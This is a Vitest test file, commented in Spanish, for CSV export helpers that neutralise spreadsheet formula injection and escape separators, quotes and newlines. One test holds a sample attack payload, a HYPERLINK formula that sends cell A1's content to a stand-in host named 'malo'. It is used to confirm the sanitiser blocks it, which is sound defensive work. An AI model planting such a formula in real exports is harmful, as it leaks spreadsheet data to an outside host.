import { describe, it, expect } from 'vitest'
import { escapeCsvValue, neutralizarFormula } from '../csv'

describe('neutralizarFormula', () => {
  it('marca como texto lo que la planilla tomaria como formula', () => {
    expect(neutralizarFormula('=1+1')).toBe("'=1+1")
    expect(neutralizarFormula('+1')).toBe("'+1")
    expect(neutralizarFormula('-1')).toBe("'-1")
    expect(neutralizarFormula('@SUM(A1)')).toBe("'@SUM(A1)")
    expect(neutralizarFormula('\tcosa')).toBe("'\tcosa")
    expect(neutralizarFormula('\rcosa')).toBe("'\rcosa")
  })

  it('no toca el texto normal', () => {
    expect(neutralizarFormula('Ford Focus')).toBe('Ford Focus')
    expect(neutralizarFormula('AB 123 CD')).toBe('AB 123 CD')
    expect(neutralizarFormula('')).toBe('')
    // Solo importa el primer caracter
    expect(neutralizarFormula('total = 5')).toBe('total = 5')
  })
})

describe('escapeCsvValue', () => {
  it('bloquea el ataque real: una formula en las observaciones', () => {
    const ataque = '=HYPERLINK("http://malo/?d="&A1,"cobrar")'
    const salida = escapeCsvValue(ataque)
    // Trae comillas, asi que ademas queda entrecomillado. Lo que importa es que
    // el contenido de la celda arranque con ' y no con =.
    expect(salida).toBe(`"'${ataque.replace(/"/g, '""')}"`)
    expect(salida.startsWith('=')).toBe(false)
  })

  it('bloquea una formula sin comillas, que no necesita entrecomillado', () => {
    expect(escapeCsvValue('=1+1')).toBe("'=1+1")
    expect(escapeCsvValue('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)")
  })

  it('escapa separador, comillas y saltos de linea', () => {
    expect(escapeCsvValue('uno;dos')).toBe('"uno;dos"')
    expect(escapeCsvValue('dice "hola"')).toBe('"dice ""hola"""')
    expect(escapeCsvValue('linea1\nlinea2')).toBe('"linea1\nlinea2"')
  })

  it('neutraliza y escapa a la vez', () => {
    // Empieza con = y ademas trae punto y coma
    expect(escapeCsvValue('=A1;B2')).toBe('"\'=A1;B2"')
  })

  it('deja los numeros intactos para que sigan sumando', () => {
    expect(escapeCsvValue(1500)).toBe('1500')
    expect(escapeCsvValue(-250)).toBe('-250')
    expect(escapeCsvValue(0)).toBe('0')
  })

  it('convierte null y undefined en celda vacia', () => {
    expect(escapeCsvValue(null)).toBe('')
    expect(escapeCsvValue(undefined)).toBe('')
  })
})
